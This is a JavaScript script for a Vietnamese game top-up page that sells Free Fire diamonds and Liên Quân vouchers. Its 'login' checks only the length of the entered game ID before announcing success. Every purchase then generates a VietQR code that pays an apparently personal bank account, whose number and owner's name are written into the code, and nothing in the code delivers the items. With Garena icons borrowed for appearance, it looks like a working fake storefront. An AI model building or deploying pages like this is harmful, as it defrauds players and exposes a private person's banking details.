<script>

let game='';

const ff=[
['50000','14.150 KC'],
['100000','28.300 KC'],
['200000','56.600 KC'],
['500000','169.800 KC']
];

const lq=[
['50000','1.100 QH'],
['100000','2.600 QH'],
['200000','6.000 QH'],
['500000','20.000 QH']
];

function openGame(g){

game=g;

document.getElementById('home').style.display='none';

document.getElementById('page').classList.add('active');

document.getElementById('packages').innerHTML='';

document.getElementById('paybox').classList.remove('active');

document.getElementById('title').innerHTML=
g==='ff'
?
'NẠP KC FREE FIRE'
:
'NẠP QUÂN HUY LIÊN QUÂN';

window.scrollTo({
top:0,
behavior:'smooth'
});

}

function goHome(){

document.getElementById('home').style.display='grid';

document.getElementById('page').classList.remove('active');

}

function loginGame(){

const uid=document.getElementById('uid').value.trim();

if(uid===''){

Swal.fire({
icon:'warning',
title:'Chưa nhập ID game',
text:'Vui lòng nhập ID game để tiếp tục',
confirmButtonColor:'#f59e0b'
});

return;
}

if(uid.length < 7){

Swal.fire({
icon:'error',
title:'ID Game Không Tồn Tại',
text:'Vui lòng kiểm tra lại ID game',
confirmButtonColor:'#ef4444'
});

return;
}

if(uid.length > 16){

Swal.fire({
icon:'error',
title:'ID Game Không Tồn Tại',
text:'Vui lòng kiểm tra lại ID game',
confirmButtonColor:'#ef4444'
});

return;
}

const data=game==='ff'?ff:lq;

const icon=
game==='ff'
?
'https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png'
:
'https://cdn-gop.garenanow.com/gop/app/0000/100/054/point.png';

let html='';

data.forEach(item=>{

html+=`

<div class="package" onclick="pay('${item[0]}')">

<h3>
${Number(item[0]).toLocaleString('vi-VN')}đ
</h3>

<div class="amount">

<img src="${icon}">

${item[1]}

</div>

<button class="buy">
NẠP NGAY
</button>

</div>

`;

});

document.getElementById('packages').innerHTML=html;

Swal.fire({
icon:'success',
title:'Đăng nhập thành công',
text:'Vui lòng chọn gói nạp',
confirmButtonColor:'#22c55e'
});

}

function pay(amount){

const code='NAP'+Math.floor(Math.random()*999999);

document.getElementById('code').innerHTML=code;

const qr=
`https://img.vietqr.io/image/VIB-090958147-compact2.png?amount=${amount}&addInfo=${code}&accountName=CAM%20MINH%20SON`;

document.getElementById('qr').src=qr;

document.getElementById('paybox').classList.add('active');

window.scrollTo({
top:document.body.scrollHeight,
behavior:'smooth'
});

}

</script>
